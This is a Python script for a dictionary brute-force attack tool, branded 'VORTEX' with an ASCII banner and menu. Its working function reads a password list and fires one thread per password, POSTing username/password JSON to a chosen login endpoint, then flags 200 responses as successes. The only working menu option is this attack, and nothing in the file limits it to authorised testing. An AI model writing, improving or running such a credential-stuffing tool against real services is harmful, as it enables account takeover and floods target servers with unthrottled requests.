import requests
import json
import sys
import threading
from queue import Queue

def print_banner():
    RED = '\033[91m'
    GRN = '\033[92m'
    RST = '\033[0m'
    banner = f"""{RED}
  _   _  ____  ____  _____  _  _  ____ 
 ( )_( )(  _ \(  _ \(  _  )( \( )( ___)
  ) _ (  )   / )   / )(_)(  )  (  )__) 
 (_) (_)(_)\_)(_)\_)(_____)(_)\_)(____)
 VORTEX v1.1 // BY NEUROPRASS
    {GRN}
 [ Focus: Speed & Power ]
    {RST}"""
    print(banner)

def build_request(username, password):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    payload = json.dumps({"username": username, "password": password})
    return headers, payload

def send_request(target_api, headers, payload, result):
    try:
        response = requests.post(target_api, headers=headers, data=payload, timeout=5)
        # Menangani jika response bukan JSON
        try:
            data = response.json()
        except:
            data = response.text
        result.put((response.status_code, data))
    except Exception as e:
        result.put((None, str(e)))

def execute_test(target_url, username, password_file):
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("[-] Error: Password file not found.")
        return

    result = Queue()
    threads = []
    print(f"[*] Starting engine with {len(passwords)} keys...")
    
    for password in passwords:
        headers, payload = build_request(username, password)
        t = threading.Thread(target=send_request, args=(target_url, headers, payload, result))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[*] Scan completed. Results:")
    while not result.empty():
        res = result.get()
        if res[0] == 200:
            print(f"[+] 200 OK: {res[1]}")
        else:
            print(f"[-] {res[0]}: {res[1]}")

def main():
    print_banner()
    while True:
        print("\n[ CORE MENU ]")
        print("1. Analyze Auth Mechanism")
        print("2. Execute Credential Test")
        print("3. Configure Headers")
        print("4. Terminate Session")
        
        choice = input("\nvortex-auth > ")
        
        if choice == "2":
            url = input("[?] Target Endpoint: ")
            user = input("[?] Username: ")
            pfile = input("[?] Password Dictionary File: ")
            execute_test(url, user, pfile)
        elif choice == "4":
            print("[*] Session terminated.")
            sys.exit()
        else:
            print("[!] Feature in development.")

if __name__ == "__main__":
    main()
